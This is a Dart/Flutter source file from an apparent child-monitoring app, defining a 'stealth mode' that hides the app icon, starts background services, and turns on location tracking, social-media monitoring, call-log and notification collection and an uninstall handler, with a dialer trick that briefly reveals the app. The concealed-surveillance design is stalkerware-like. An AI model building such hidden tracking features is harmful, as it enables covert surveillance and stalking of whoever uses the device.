import 'package:shared_preferences/shared_preferences.dart';
import 'package:child_app/utils/native_channel.dart';
import 'package:child_app/services/location_service.dart';
import 'package:child_app/services/social_monitor.dart';
import 'package:child_app/services/call_log_service.dart';
import 'package:child_app/services/notification_service.dart';
import 'package:child_app/services/time_limit_service.dart';
import 'package:child_app/services/uninstall_handler.dart';

class StealthHandler {
  static Future<bool> isStealthActive() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('stealth_active') ?? false;
  }

  static Future<void> activateStealthMode() async {
    // 1. Hide app icon
    await NativeChannel.hideAppIcon();
    
    // 2. Start background services
    await NativeChannel.startStealthService();
    
    // 3. Save state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('stealth_active', true);
    
    // 4. Start all monitoring services
    _startMonitoringServices();
  }

  static Future<void> deactivateStealthMode() async {
    // 1. Show app icon
    await NativeChannel.unhideAppIcon();
    
    // 2. Stop all background services
    _stopMonitoringServices();
    
    // 3. Save state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('stealth_active', false);
  }

  static void _startMonitoringServices() {
    // Start all background services
    LocationService.start();
    SocialMonitor.start();
    CallLogService.start();
    NotificationService.start();
    TimeLimitService.init();
    UninstallHandler.init();
  }

  static void _stopMonitoringServices() {
    // Stop all background services
    LocationService.stop();
    SocialMonitor.stop();
    CallLogService.stop();
    NotificationService.stop();
    TimeLimitService.dispose();
    UninstallHandler.dispose();
  }

  static Future<void> showViaDialer() async {
    // Temporarily show app
    await NativeChannel.unhideAppIcon();
    
    // Schedule re-hide after 5 minutes
    Future.delayed(const Duration(minutes: 5), () async {
      if (await isStealthActive()) {
        await NativeChannel.hideAppIcon();
      }
    });
  }
}